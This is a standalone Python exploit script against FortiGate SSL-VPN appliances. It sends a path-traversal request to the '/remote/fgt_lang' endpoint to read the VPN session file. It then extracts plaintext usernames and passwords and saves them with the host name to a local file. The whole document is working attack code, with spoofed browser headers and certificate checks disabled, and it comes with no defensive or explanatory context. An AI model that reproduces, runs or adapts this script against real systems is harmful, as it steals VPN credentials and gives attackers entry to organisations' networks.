


import urllib3
import time
import requests
import itertools
import re
import sys

def extract(dom):
    url = f"https://{dom}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    headers = {'Host': dom,
               'Connection': 'keep-alive',
               'Upgrade-Insecure-Requests': '1',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Sec-Fetch-Site': 'none',
               'Sec-Fetch-Mode': 'navigate',
               'Sec-Fetch-User': '?1',
               'Sec-Fetch-Dest': 'document',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'en-GB,en;q=0.9'}
    response = requests.request("GET", url, headers=headers, verify=False)
    try:
        kotomoto = response.text
        ip03 = re.findall(r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})', kotomoto)
        if ip03:
            with open(f"True.txt", '+a') as f:
                time.sleep(0.002)
                koto = kotomoto.split(ip03[0])[1]
                control_chars = ''.join(map(chr, itertools.chain(range(0x00, 0x20), range(0x7f, 0xa0))))
                control_char_re = re.compile('[%s]' % re.escape(control_chars))
                def remove_control_chars(s):
                    return control_char_re.sub('~~~', s)
                aaa = remove_control_chars(koto)
                encoded_string = aaa.encode("ascii", "ignore")
                aaa = encoded_string.decode()
                aaa = " ".join(aaa.split())
                UP = aaa.split("~~~")
                aaaaa = [x.strip() for x in UP if x.strip()]
                U = aaaaa[0]
                P = aaaaa[1]
                print(end=f"\r    Exploit  {f'{dom}': <27} True {U}|{P}\n")
                f.writelines(f' VPN_HOST={dom}\n VPN_USER="{U}"\n VPN_PASS="{P}"\n  \n')
                f.close()
        else:
            print(end=f"\r    Exploit  {f'{dom}': <27} Failed to Extract User & Password (No VPNs)\n")
            with open(f"noSessions.txt", '+a') as f:
                f.writelines(f"{dom}\n")
                f.close()
    except:
        print(end=f"\r    Exploit  {f'{dom}': <27} Failed to Extract User & Password (No Response)\n")
        with open(f"False.txt", '+a') as f:
            f.writelines(f"{dom}\n")
            f.close()
if __name__ == '__main__':
    urllib3.disable_warnings()
    dom = str(sys.argv[1])
    try:
        ex = extract(dom)
    except:
        print(end=f"\r    Exploit  {f'{dom}': <27} Failed to Extract User & Password (Server Error)\n")
        with open(f"False.txt", '+a') as f:
            f.writelines(f"{dom}\n")
            f.close()
